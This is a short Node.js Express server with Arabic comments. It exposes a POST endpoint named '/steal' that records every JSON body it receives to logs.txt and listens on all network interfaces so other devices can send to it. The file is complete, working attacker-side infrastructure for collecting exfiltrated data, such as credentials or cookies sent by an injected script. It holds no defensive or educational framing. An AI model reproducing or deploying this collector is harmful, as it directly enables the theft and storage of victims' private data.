const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const port = 3000;

// لدعم استقبال JSON في POST
app.use(bodyParser.json());

// استقبال بيانات من العميل وتسجيلها في ملف logs.txt
app.post('/steal', (req, res) => {
  console.log('Received data:', req.body);

  // تخزين البيانات في ملف logs.txt مع إضافة newline لكل بيانات جديدة
  fs.appendFile('logs.txt', JSON.stringify(req.body) + '\n', (err) => {
    if (err) {
      console.error('Failed to write to file:', err);
    }
  });

  res.sendStatus(200);
});

// تشغيل السيرفر على كل الواجهات (عشان تستقبل طلبات من الأجهزة الثانية في الشبكة)
app.listen(port, '0.0.0.0', () => {
  console.log(`Server listening at http://0.0.0.0:${port}`);
});
